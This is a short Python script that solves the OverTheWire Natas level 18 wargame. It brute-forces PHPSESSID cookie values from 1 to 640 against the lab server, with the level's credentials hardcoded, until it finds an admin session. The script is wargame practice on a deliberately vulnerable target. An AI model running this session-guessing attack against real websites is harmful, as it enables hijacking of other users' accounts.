#! /usr/bin/python

import requests

def findAdminSession():
	url = "http://natas18.natas.labs.overthewire.org/"
	auth_username = "natas18"
	auth_password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
	
	
	for i in range(1,641):
		if i % 10 == 0:
                	print('Checked {} sessions...'.format(i))
		cookies = {'PHPSESSID':str(i)}
		r = requests.get(url, auth=(auth_username,auth_password), cookies=cookies)
		if "You are an admin." in r.text:
                	print('Got it! Session={}'.format(str(i)))
                	print(r.text)
                	break

	print('Done.')


findAdminSession()
